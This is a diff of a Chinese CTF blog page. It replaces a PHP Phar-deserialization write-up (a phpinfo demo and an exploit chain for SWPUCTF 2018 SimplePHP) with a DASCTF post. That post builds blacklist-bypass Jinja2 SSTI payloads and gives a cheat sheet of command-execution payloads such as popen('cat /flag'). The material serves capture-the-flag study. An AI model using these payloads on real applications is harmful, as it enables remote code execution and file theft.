@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Phar反序列化, Keep-Boom">
+    <meta name="keywords" content="dasctf部分wp, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Phar反序列化 | Keep-Boom</title>
+    <title>dasctf部分wp | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Phar反序列化</h1>
+                    <h1 class="description center-align post-title">dasctf部分wp</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-28
+                    2021-03-29
                 </div>
                 
 
@@ -459,209 +459,319 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="Phar本地测验"><a href="#Phar本地测验" class="headerlink" title="Phar本地测验"></a>Phar本地测验</h3><pre><code>&lt;?php
-$filename=$_GET[&#39;filename&#39;];
-class AnyClass&#123;
-    function __destruct()
-    &#123;
-        eval($this -&gt;data);
-    &#125;
-&#125;
-include ($filename);
-?&gt;</code></pre>
-<pre><code>&lt;?php
-class AnyClass&#123;
-    function __destruct()
-    &#123;
-        eval($this -&gt;data);
-    &#125;
-&#125;
- $a = new AnyClass();
- $a-&gt;data = &quot;phpinfo();&quot;;
- $phar = new Phar(&quot;1.phar&quot;);//创建一个文件，后缀必须是phar
- $phar-&gt;startBuffering();
- $phar-&gt;setStub(&quot;GIF89a&quot;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);//php解析时是看这句来识别phar文件的 __HALT_COMPILER();？&gt;,前面可以加上GIF89a的头，来绕过一些检测
- $phar-&gt;setMetadata($a);//以序列化的形式存储用户自定义的meta-data，phar://伪协议解析的时候，都会将meta-data进行反序列化
- $phar-&gt;addFromString(&quot;text.txt&quot;,&quot;text&quot;);
- $phar-&gt;stopBuffering();
+                <h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><h3 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h3><p>黑名单</p>
+<pre><code>blacklist&lt;/br&gt;   
+&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   
+&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   
+&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt;   
+&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt;   
+&#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt;   
+&lt;/br&gt;</code></pre>
+<p>可以看到几乎都过滤了</p>
+<p>config过滤了可以用lipsum获取数字（当然也可以用其他的）</p>
+<p><img src="/images/64.png"></p>
+<p>利用index 返回了 1</p>
+<p><img src="/images/65.png"></p>
+<p>因为过滤了引号，所以可以利用join过滤器来绕过</p>
+<p><img src="/images/66.png"></p>
+<p>点 .  []  也被过滤了，利用 attr 和 pop获取 _</p>
+<pre><code>&#123;% set id=dict(ind=a,ex=a)|join%&#125;
+&#123;% set pp=dict(po=a,p=a)|join%&#125;
+&#123;% set nn=dict(n=a)|join%&#125;
+&#123;% set tt=dict(t=a)|join%&#125;
+&#123;% set ff=dict(f=a)|join%&#125;
+&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;
+&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;
+&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;
+&#123;% set shiba=five*five-three-three-one %&#125;
+&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;
+&#123;&#123;xiahuaxian&#125;&#125;
+相当于
+(lipsum|string|list)[18] &lt;=&gt; (lipsum|string|list).pop(18)</code></pre>
+<p><img src="/images/67.png"></p>
+<p>最终payload</p>
+<pre><code>&#123;% set id=dict(ind=a,ex=a)|join%&#125;
+&#123;% set pp=dict(po=a,p=a)|join%&#125;
+&#123;% set ls=dict(ls=a)|join%&#125;
+&#123;% set ppe=dict(po=a,pen=a)|join%&#125;
+&#123;% set gt=dict(ge=a,t=a)|join%&#125;
+&#123;% set cr=dict(ch=a,r=a)|join%&#125;
+&#123;% set nn=dict(n=a)|join%&#125;
+&#123;% set tt=dict(t=a)|join%&#125;
+&#123;% set ff=dict(f=a)|join%&#125;
+&#123;% set ooqq=dict(o=a,s=a)|join %&#125;
+&#123;% set rd=dict(re=a,ad=a)|join%&#125;
+&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;
+&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;
+&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;
+&#123;% set shiba=five*five-three-three-one %&#125;
+&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;
+&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;
+&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;
+&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;
+&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;
+&#123;% set space=chcr(three*three*five-five-five-three) %&#125;
+&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;
+&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;</code></pre>
+<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">jinja2官方文档</a></p>
+<pre><code>&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。
+&#123;&#123;&#125;&#125;用于将表达式打印到模板输出
+&#123;##&#125;表示未包含在模板输出中的注释
+##可以有和&#123;%%&#125;相同的效果</code></pre>
+<pre><code>&#123;% set x= 'abcd' %&#125;  声明变量
+&#123;% for i in ['a','b','c'] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125; 循环语句
+&#123;% if 25==5*5 %&#125;&#123;&#123;1&#125;&#125;&#123;% endif %&#125;  条件语句</code></pre>
+<p><strong>[BJDCTF 2nd]fake google</strong>用来复现的地方（在buu平台）</p>
+<pre><code>__class__            类的一个内置属性，表示实例对象的类。
+__base__             类型对象的直接基类
+__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
+__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
+__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
+__init__             初始化类，返回的类型是function
+__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
+__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
+__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
+__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
+__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
+__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
+__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
+url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
+get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
+lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;
+current_app          应用上下文，一个全局变量。
 
-?&gt;</code></pre>
-<p>在该目录下生成1.phar的文件。</p>
-<p>然后GET传参 filename=phar://1.phar解析文件，出现phpinfo()详细信息，成功。</p>
-<h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>在文件查看那个位置进行文件包含，查看能得到文件的源码。</p>
-<pre><code>#file.php
-&lt;?php 
-header(&quot;content-type:text/html;charset=utf-8&quot;);  
-include &#39;function.php&#39;; 
-include &#39;class.php&#39;; 
-ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); 
-$file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; 
-if(empty($file)) &#123; 
-    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; 
-&#125; 
-$show = new Show(); 
-if(file_exists($file)) &#123; 
-    $show-&gt;source = $file; 
-    $show-&gt;_show(); 
-&#125; else if (!empty($file))&#123; 
-    die(&#39;file doesn\&#39;t exists.&#39;); 
-&#125; 
-?&gt; </code></pre>
-<pre><code>#function.php
-&lt;?php 
-//show_source(__FILE__); 
-include &quot;base.php&quot;; 
-header(&quot;Content-type: text/html;charset=utf-8&quot;); 
-error_reporting(0); 
-function upload_file_do() &#123; 
-    global $_FILES; 
-    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; 
-    //mkdir(&quot;upload&quot;,0777); 
-    if(file_exists(&quot;upload/&quot; . $filename)) &#123; 
-        unlink($filename); 
-    &#125; 
-    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); 
-    echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; 
-&#125; 
-function upload_file() &#123; 
-    global $_FILES; 
-    if(upload_file_check()) &#123; 
-        upload_file_do(); 
-    &#125; 
-&#125; 
-function upload_file_check() &#123; 
-    global $_FILES; 
-    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); 
-    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); 
-    $extension = end($temp); 
-    if(empty($extension)) &#123; 
-        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; 
-    &#125; 
-    else&#123; 
-        if(in_array($extension,$allowed_types)) &#123; 
-            return true; 
-        &#125; 
-        else &#123; 
-            echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;; 
-            return false; 
-        &#125; 
-    &#125; 
-&#125; 
-?&gt;</code></pre>
-<pre><code>#class.php
-&lt;?php
-class C1e4r
-&#123;
-    public $test;
-    public $str;
-    public function __construct($name)
-    &#123;
-        $this-&gt;str = $name;
-    &#125;
-    public function __destruct()
-    &#123;
-        $this-&gt;test = $this-&gt;str;
-        echo $this-&gt;test;
-    &#125;
-&#125;
+request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()
+request.args.x1        get传参
+request.values.x1      所有参数
+request.cookies      cookies参数
+request.headers      请求头参数
+request.form.x1        post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
+request.data           post传参    (Content-Type:a/b)
+request.json         post传json  (Content-Type: application/json)
+config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;
+g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre>
+<p>常用的过滤器</p>
+<pre><code>
+int()：将值转换为int类型；
 
-class Show
-&#123;
-    public $source;
-    public $str;
-    public function __construct($file)
-    &#123;
-        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg
-        echo $this-&gt;source;
-    &#125;
-    public function __toString()
-    &#123;
-        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;
-        return $content;
-    &#125;
-    public function __set($key,$value)
-    &#123;
-        $this-&gt;$key = $value;
-    &#125;
-    public function _show()
-    &#123;
-        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;
-            die(&#39;hacker!&#39;);
-        &#125; else &#123;
-            highlight_file($this-&gt;source);
-        &#125;
+float()：将值转换为float类型；
 
-    &#125;
-    public function __wakeup()
-    &#123;
-        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;
-            echo &quot;hacker~&quot;;
-            $this-&gt;source = &quot;index.php&quot;;
-        &#125;
-    &#125;
-&#125;
-class Test
-&#123;
-    public $file;
-    public $params;
-    public function __construct()
-    &#123;
-        $this-&gt;params = array();
-    &#125;
-    public function __get($key)
-    &#123;
-        return $this-&gt;get($key);
-    &#125;
-    public function get($key)
-    &#123;
-        if(isset($this-&gt;params[$key])) &#123;
-            $value = $this-&gt;params[$key];
-        &#125; else &#123;
-            $value = &quot;index.php&quot;;
-        &#125;
-        return $this-&gt;file_get($value);
-    &#125;
-    public function file_get($value)
-    &#123;
-        $text = base64_encode(file_get_contents($value));
-        return $text;
-    &#125;
-&#125;
-?&gt; </code></pre>
-<p>POP链 C1e4r类的echo $this-&gt;test,可以触发Show类的__toString(),接着Show类的$this-&gt;str[‘str’]-&gt;source，可以用来触发Test类的 _get() -&gt;触发get函数 -&gt;触发file_get函数 base64打印出文件。</p>
-<p>exp</p>
-<p>这里有个地方很奇怪，读取 flag 只能用决定路径，不能使用相对路径</p>
-<pre><code>&lt;?php
-class C1e4r
-&#123;
-    public $test;
-    public $str;
-&#125;
+lower()：将字符串转换为小写；
 
-class Show
-&#123;
-    public $source;
-    public $str;
-&#125;
-class Test
-&#123;
-    public $file;
-    public $params;   
-&#125;
-$a = new C1e4r();
-$b = new Show();
-$c = new Test();
-$a-&gt;str = $b;
-$b-&gt;str[&#39;str&#39;] = $c;
-$c-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;
-$phar = new Phar(&#39;2.phar&#39;);
-$phar-&gt;startBuffering();
-$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);
-$phar-&gt;setMetadata($a);
-$phar-&gt;addFromString(&#39;text.txt&#39;,&#39;text&#39;);
-$phar-&gt;stopBuffering();
-?&gt; </code></pre>
-<p>然后进upload查看下新生成的文件名，利用文件包含执行phar://来解析文件，修改下后缀名绕过。</p>
+upper()：将字符串转换为大写；
+
+title()：把值中的每个单词的首字母都转成大写；
+
+capitalize()：把变量值的首字母转成大写，其余字母转小写；
+
+trim()：截取字符串前面和后面的空白字符；
+
+wordcount()：计算一个长字符串中单词的个数；
+
+reverse()：字符串反转；
+
+replace(value,old,new)： 替换将old替换为new的字符串；
+
+truncate(value,length=255,killwords=False)：截取length长度的字符串；
+
+striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
+
+escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。
+
+safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；
+
+list()：将变量列成列表；
+
+string()：将变量转换成字符串；
+
+join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
+
+abs()：返回一个数值的绝对值；
+
+first()：返回一个序列的第一个元素；
+
+last()：返回一个序列的最后一个元素；
+
+format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!
+
+length()：返回一个序列或者字典的长度；
+
+sum()：返回列表内数值的和；
+
+sort()：返回排序后的列表；
+
+default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
+
+length()返回字符串的长度，别名是count</code></pre>
+<p>比如查看一下os._wrap_close类所处空间下可使用的module,方法和变量,利用.keys()爆出这个dict的所有键名</p>
+<pre><code>print(&#39;&#39;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__.keys())</code></pre>
+<p>一下注入点均是name</p>
+<p>#0x01</p>
+<p>用以下已有的函数，去得到builtins，然后用eval就可以了</p>
+<pre><code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
+<p>#0x02</p>
+<p>另一种姿势去得到builtins</p>
+<pre><code>&#123;&#123;x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
+<p>这里的x任意26个英文字母的任意组合都可以，同样可以得到<code>__builtins__</code>然后用eval就可以了。</p>
+<p>#0x03</p>
+<p>学习一下用<code>&#123;% %&#125;</code>来SSTI</p>
+<pre><code>&#123;% for i in ''.__class__.__mro__[1].__subclasses__() %&#125;&#123;% if i.__name__=='_wrap_close' %&#125;&#123;% print i.__init__.__globals__['popen']('ls').read() %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
+<p>#0x04</p>
+<p>因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他</p>
+<pre><code>?name=&#123;%set chr=url_for.__globals__.__builtins__.chr%&#125;&#123;%print url_for.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()%&#125;</code></pre>
+<p>#0x05</p>
+<p>过滤了单双引号，可以用request来绕过</p>
+<p>get</p>
+<pre><code>?a=os&amp;b=popen&amp;c=cat /flag&amp;name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;</code></pre>
+<p>post</p>
+<pre><code>?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;
+cookie:a=os;b=popen;c=cat /flag</code></pre>
+<p>当然还可以使用cookie绕过。看上面！</p>
+<p>#0x06</p>
+<p>字符串拼接，这里用config拿到字符串</p>
+<pre><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;
+等价于
+?name=&#123;&#123;url_for.__globals__['os']&#125;&#125;</code></pre>
+<p>#0x07</p>
+<p>过滤了[，用点绕过或__getitem，或pop</p>
+<pre><code>?name=&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
+<pre><code>&#123;&#123;''.__class__.__mro__.__getitem__(1).__subclasses__().pop(117).__init__.__globals__.popen('ls').read()&#125;&#125;</code></pre>
+<p>使用request绕过的话可以这样</p>
+<pre><code>?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125;&#125;
+Cookie:c=cat /flag</code></pre>
+<p>#0x08</p>
+<p>点  .  和 [ 都被ban了 ，用attr()绕过 </p>
+<p>！！有点小问题</p>
+<pre><code>&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')&#125;&#125;</code></pre>
+<p>#0x09  16进制绕过</p>
+<pre><code>&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
+对于python2的话，还可以利用base64进行绕过
+&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>
+<pre><code>&#123;%print(
+()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f") 
+//__class__
+
+|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")      
+//__base__
+
+|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()
+//__subclasses__
+
+|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(202)   
+//__getitem__
+
+|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")  
+//__init__
+
+|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f") 
+//__globals__
+
+|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")
+//__getitem__('__builtins')
+
+|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x65\x76\x61\x6c") 
+//__getitem__('eval')
+
+("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29")
+//("__import__('os').popen('cat flag.txt').read()")
+)%&#125;</code></pre>
+<p>#0x0A</p>
+<p>在jinja2里面可以利用~进行拼接</p>
+<pre><code>&#123;% set a='__cla' %&#125;&#123;% set b='ss__'%&#125;&#123;%print( ''[a~b])%&#125;</code></pre>
+<p>#0x0B</p>
+<p>大小写转换</p>
+<p>前提是过滤的只是小写</p>
+<pre><code>&#123;&#123;''["__CLASS__".lower()]&#125;&#125;</code></pre>
+<p>#0x0C</p>
+<p>拼接</p>
+<pre><code>&quot;cla&quot;+&quot;ss&quot;</code></pre>
+<p>反转</p>
+<pre><code>&quot;__ssalc__&quot;[::-1]</code></pre>
+<pre><code>&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
+&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)
+&quot;&quot;[&quot;__ssalc__&quot;[::-1]]
+&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>
+<p>#0x0D</p>
+<p>除了第一个其他几个我测的时候会出错。不知道为啥！！</p>
+<pre><code>&#123;&#123;url_for.__globals__['__builtins__']&#125;&#125;
+&#123;&#123;url_for.__globals__.__getitem__('__builtins__')&#125;&#125;
+&#123;&#123;url_for.__globals__.pop('__builtins__')&#125;&#125;
+&#123;&#123;url_for.__globals__.get('__builtins__')&#125;&#125;
+&#123;&#123;url_for.__globals__.setdefault('__builtins__')&#125;&#125;</code></pre>
+<p><strong>过滤器</strong></p>
+<pre><code>Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may 
+have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is 
+applied to the next.
+For example, &#123;&#123; name|striptags|title &#125;&#125; will remove all HTML Tags from variable name and title-case the
+output (title(striptags(name))).
+
+变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多
+个过滤器。一个过滤器的输出应用于下一个过滤器。
+
+例如，&#123;&#123; name|striptags|title &#125;&#125; 将删除变量名中的所有HTML标记，并将title大小写为输出(title(striptags(name)))。</code></pre>
+<p>attr</p>
+<pre><code>Get an attribute of an object. foo|attr(&quot;bar&quot;) works like foo.bar just that always an attribute is returned and 
+items are not looked up.</code></pre>
+<p>也就是说 attr用于获取变量</p>
+<p>具体实例看上面！</p>
+<p>format</p>
+<pre><code>&#123;&#123; "%s, %s!"|format(greeting, name) &#125;&#125;</code></pre>
+<pre><code>&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)] ==&quot;&quot;.__class__</code></pre>
+<p>join</p>
+<pre><code>Return a string which is the concatenation of the strings in the sequence. The separator between elements is an
+empty string per default, you can define it with the optional parameter:
+
+&#123;&#123; [1, 2, 3]|join('|') &#125;&#125;
+    -&gt; 1|2|3
+
+&#123;&#123; [1, 2, 3]|join &#125;&#125;
+    -&gt; 123
+It is also possible to join certain attributes of an object:
+&#123;&#123; users|join(', ', attribute='username') &#125;&#125;</code></pre>
+<pre><code>&quot;&quot;[[&#39;__clas&#39;,&#39;s__&#39;]|join] 或者 &quot;&quot;[(&#39;__clas&#39;,&#39;s__&#39;)|join]  ==  &quot;&quot;.__class__</code></pre>
+<p>replace reverse</p>
+<p>可以利用替换和反转还原回我们要用的字符串</p>
+<pre><code>&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;
+&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</code></pre>
+<p>string</p>
+<pre><code>().__class__   出来的是&lt;class &#39;tuple&#39;&gt;
+(().__class__|string)[0] 出来的是&lt;</code></pre>
+<p>select unique</p>
+<pre><code>Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.
+If no test is specified, each object will be evaluated as a boolean.
+通过对每个对象应用测试并仅选择测试成功的对象来筛选对象序列。
+如果没有指定测试，则每个对象都将被计算为布尔值
+
+Returns a list of unique items from the given iterable.</code></pre>
+<pre><code>()|select|string
+结果如下
+&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;
+012345678901234567890123456789012345678901234567890123456</code></pre>
+<p>拼接</p>
+<pre><code>(()|select|string)[24]~
+(()|select|string)[24]~
+(()|select|string)[15]~
+(()|select|string)[20]~
+(()|select|string)[6]~
+(()|select|string)[18]~
+(()|select|string)[18]~
+(()|select|string)[24]~
+(()|select|string)[24]
+
+得到字符串 __class__</code></pre>
+<p>list</p>
+<p>转换成列表<br>更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了<br>只是单纯的字符串的话取单个字符方法有限</p>
+<pre><code>(()|select|string)[0]
+如果中括号被过滤了，挺难的
+但是列表的话就可以用pop取下标了
+当然都可以使用__getitem__</code></pre>
+<pre><code>(()|select|string|list).__getitem__(24)~
+(()|select|string|list).pop(24)~
+(()|select|string|list)|attr(&#39;__getitem__&#39;)(15)~</code></pre>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113866139">https://blog.csdn.net/rfrder/article/details/113866139</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a></p>
 
             </div>
             <hr/>
@@ -687,7 +797,7 @@ $phar-&gt;stopBuffering();
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/03/28/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2021/03/28/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                    <a href="http://example.com/2021/03/29/dasctf%E9%83%A8%E5%88%86wp/">http://example.com/2021/03/29/dasctf%E9%83%A8%E5%88%86wp/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -892,9 +1002,10 @@ $phar-&gt;stopBuffering();
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/03/29/dasctf%E9%83%A8%E5%88%86wp/">
                     <div class="card-image">
@@ -912,9 +1023,9 @@ $phar-&gt;stopBuffering();
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-29
